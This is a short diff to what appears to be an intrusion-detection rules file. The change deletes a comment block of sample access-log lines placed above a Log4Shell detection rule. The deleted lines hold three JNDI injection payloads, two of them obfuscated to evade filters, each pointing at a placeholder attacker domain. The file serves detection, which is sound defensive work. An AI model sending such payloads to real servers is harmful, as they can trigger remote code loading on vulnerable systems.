@@ -346,10 +346,6 @@
 
   <!--
     Log4Shell exploit attempt
-    Examples:
-    192.168.2.100 - - [02/Nov/2015:01:35:55 +0100] "GET /?x=${jndi:rmi://[attacker_domain]/file} HTTP/1.1" 200 879 "-" "Mozilla/5.0..."
-    192.168.2.100 - - [02/Nov/2015:01:35:55 +0100] "GET /?x=${${::-j}ndi:rmi://[attacker_domain]/file} HTTP/1.1" 200 879 "-" "Mozilla/5.0..."
-    192.168.2.100 - - [02/Nov/2015:01:35:55 +0100] "GET /?x=${${lower:jndi}:${lower:rmi}://[attacker_domain]/file} HTTP/1.1" 200 879 "-" "Mozilla/5.0..."
   -->
   <rule id="31172" level="7">
     <if_group>web|accesslog|attack</if_group>
